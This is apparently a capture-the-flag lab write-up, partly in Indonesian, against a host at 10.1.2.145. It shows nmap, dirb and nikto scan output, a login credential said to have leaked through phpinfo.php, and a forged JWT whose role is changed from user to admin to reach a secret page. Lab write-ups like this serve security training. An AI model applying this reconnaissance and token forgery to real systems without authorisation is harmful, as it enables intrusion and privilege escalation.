
# Enemuration

Nmap

```
# Nmap 7.94SVN scan initiated Tue Feb 27 20:56:13 2024 as: nmap -sC -sV -oN nmapx -p- -T4 --min-rate=1000 -v 10.1.2.145
Warning: 10.1.2.145 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.1.2.145
Host is up (0.24s latency).
Not shown: 65482 closed tcp ports (conn-refused), 51 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:06:eb:45:98:f7:f9:c9:1b:15:b7:9f:95:24:41:f2 (RSA)
|   256 87:56:ee:f9:84:5a:08:10:eb:6c:fa:1a:93:fc:40:56 (ECDSA)
|_  256 b3:92:37:26:3a:cd:89:9d:88:5d:85:81:b2:8c:97:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was /login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 27 20:58:11 2024 -- 1 IP address (1 host up) scanned in 118.14 seconds

```


Dirb

```

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbx.txt
START_TIME: Tue Feb 27 21:02:31 2024
URL_BASE: http://10.1.2.145/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.1.2.145/ ----

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbx.txt
START_TIME: Tue Feb 27 22:15:10 2024
URL_BASE: http://10.1.2.145/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.1.2.145/ ----
+ http://10.1.2.145/index.php (CODE:302|SIZE:0)
+ http://10.1.2.145/phpinfo.php (CODE:200|SIZE:75790)
+ http://10.1.2.145/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://10.1.2.145/src/
==> DIRECTORY: http://10.1.2.145/vendor/

---- Entering directory: http://10.1.2.145/src/ ----

---- Entering directory: http://10.1.2.145/vendor/ ----
==> DIRECTORY: http://10.1.2.145/vendor/bin/
==> DIRECTORY: http://10.1.2.145/vendor/composer/

---- Entering directory: http://10.1.2.145/vendor/bin/ ----

---- Entering directory: http://10.1.2.145/vendor/composer/ ----
+ http://10.1.2.145/vendor/composer/LICENSE (CODE:200|SIZE:1068)

-----------------
END_TIME: Tue Feb 27 23:53:18 2024
DOWNLOADED: 23060 - FOUND: 4

```


Nikto
```
└─$ nikto -h http://10.1.2.145           
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.1.2.145
+ Target Hostname:    10.1.2.145
+ Target Port:        80
+ Start Time:         2024-02-27 21:18:40 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: /login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /login.php: Admin login page/section found.
+ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ 8103 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-02-27 21:52:53 (GMT7) (2053 seconds)
---------------------------------------------------------------------------
+ 1 host(s) teste
```


# Exploitation

Pada scan menggunakan nikto terdapat file `phpinfo.php` yang terdapat informasi credential user untuk login `Charis:14m@we50m3`

![alt text](images/credential.png)

Setelah login hanya terdapat 1 halaman untuk dilihat user tapi pada checklist di halaman tersebut mengatakan ada halaman `secret` yang hanya bisa di akses oleh admin.

![alt text](images/user-page.png)


Memanipulasi Role jwt token dari user menjadi admin untuk mengakses `secret page`

```
JWT TOKEN

{"typ":"JWT","alg":"HS256"}{"username":"Charis","role":"user","realm":"Atulieer"}'-DN`du3N)Cؾ

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkNoYXJpcyIsInJvbGUiOiJ1c2VyIiwicmVhbG0iOiJBdHVsaWVlciJ9.JxMtw-7yxRpETqJgZAWGpx11ujOKThcVKcJDnu_Yvvo


CUSTOM JWT TOKENS

{"typ":"JWT","alg":"HS256"}{"username":"Charis","role":"admin","realm":"Atulieer"}�em#.P|/LS'

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkNoYXJpcyIsInJvbGUiOiJhZG1pbiIsInJlYWxtIjoiQXR1bGllZXIifQ.BljW2JHQQjz_guCp2eBB9Q_b31ta58L7CLrdZMs1Mns

```

![alt text](images/secret-page.png)


 